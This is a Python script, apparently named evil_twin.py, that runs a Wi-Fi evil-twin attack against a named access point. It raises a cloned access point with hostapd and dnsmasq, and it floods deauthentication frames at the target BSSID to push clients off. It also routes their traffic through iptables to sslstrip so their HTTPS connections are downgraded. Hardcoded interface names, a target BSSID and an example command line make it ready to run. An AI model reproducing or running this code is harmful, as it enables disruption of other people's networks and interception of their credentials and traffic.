import utils
from threading import Thread
import time
import deauth

from argparse import ArgumentParser

DEAUTHER = "wlxf4ec388d723b"
ROUGE_AP = "wlx34080432263f"
BROD_MAC = "ff:ff:ff:ff:ff:ff"
PHYS = "wlp3s0"
TARGET_BSSID = "14:ae:db:ca:3d:0a"

# Example run: psudo python evil_twin.py -u wlx34080432263f -r wlxf4ec388d723b -i wlp3s0 -b 14:ae:db:ca:3d:0a -s ahome2.4 -c 1

def set_configs():

    parser = ArgumentParser()

    parser.add_argument(
        "-u",
        dest="upstream",
        required=True,
        type=str,
        metavar="<upstream interface>",
        help="Use this interface as access point.",
    )

    parser.add_argument(
        "-r",
        dest="death",
        required=True,
        type=str,
        metavar="<deauth interface>",
        help="Use this interface as deauther (must be monitor mode).",
    )

    parser.add_argument(
        "-i",
        dest="phys",
        required=True,
        type=str,
        metavar="<gateway interface>",
        help="Use this interface to connect to network gateway.",
    )

    parser.add_argument(
        "-b",
        dest="bssid",
        required=True,
        type=str,
        metavar="<bssid>",
        help="The bssid of the target ap.",
    )

    parser.add_argument(
        "-s",
        dest="ssid",
        required=True,
        type=str,
        metavar="<ssid>",
        help="The ssid of the target ap.",
    )

    parser.add_argument(
        "-c",
        dest="channel",
        required=True,
        type=int,
        metavar="<channel>",
        help="The channel of the target ap.",
    )

    args = parser.parse_args()

    return {
        "upstream": args.upstream,
        "phys": args.phys,
        "death": args.death,
        "ssid": args.ssid,
        "bssid": args.bssid,
        "channel": args.channel,
    }


def display_configs(configs):

    print("[+] Access Point interface:", configs["upstream"])
    print("[+] Network interface:", configs["phys"])
    print("[+] Target AP BSSID:", configs["bssid"])
    print("[+] Target AP Name:", configs["ssid"])
    print("[+] Target AP Channel:", configs["channel"])


def kill_daemons():

    print("[*] Killing existing dnsmasq and hostapd processes.")

    utils.bash_command("killall dnsmasq")
    utils.bash_command("killall hostapd")

    print("[*] Continuing...")


def main():

    configs = set_configs()
    display_configs(configs)
    kill_daemons()

    hostapd = utils.HostAPD.get_instance()
    iptables = utils.IPTables.get_instance()
    dnsmasq = utils.DNSMasq.get_instance()

    # bring up ap interface
    utils.bash_command("ifconfig %s down" % configs["upstream"])
    utils.bash_command("ifconfig %s 10.0.0.1/24 up" % configs["upstream"])

    # prepare deauth thread
    deauther = Thread(target=deauth.deauth,args=(BROD_MAC, configs["bssid"], configs["death"]))
    deauther.daemon = True

    # configure dnsmasq
    print("[*] Configuring dnsmasq")
    dnsmasq.configure(
        configs["upstream"],
        "10.0.0.10,10.0.0.250,255.255.255.0,12h",
        dhcp_options=["3,10.0.0.1", "6,10.0.0.1"],
    )

    # configure hostpad
    print("[*] Configuring hostapd")
    hostapd.configure(configs["upstream"], configs["ssid"], configs["channel"])

    # enable packet forwarding
    print("[*] Enabling packet forwarding.")
    utils.enable_packet_forwarding()

    print("[*] Configuring iptables to route packets to sslstrip")
    iptables.route_to_sslstrip(configs["phys"], configs["upstream"])

    try:
        # launch access point
        print("[*] Starting dnsmasq.")
        dnsmasq.start()
        print("[*] Starting hostapd.")
        hostapd.start()
        print("[*] Starting deauth attack.")
        deauther.start()
        deauther.join()
    except KeyboardInterrupt:
        deauther.do_run = False
        deauther.join()
        print("\n\n[*] Exiting on user command.")

    # restore everything
    print("[x] Terminating.")
    print("[*] Stopping dnsmasq.")
    dnsmasq.stop()
    print("[*] Stopping hostapd.")
    hostapd.stop()

    print("[*] Restoring iptables.")
    iptables.reset()

    print("[*] Disabling packet forwarding.")
    utils.disable_packet_forwarding()

    kill_daemons()


if __name__ == "__main__":
    main()
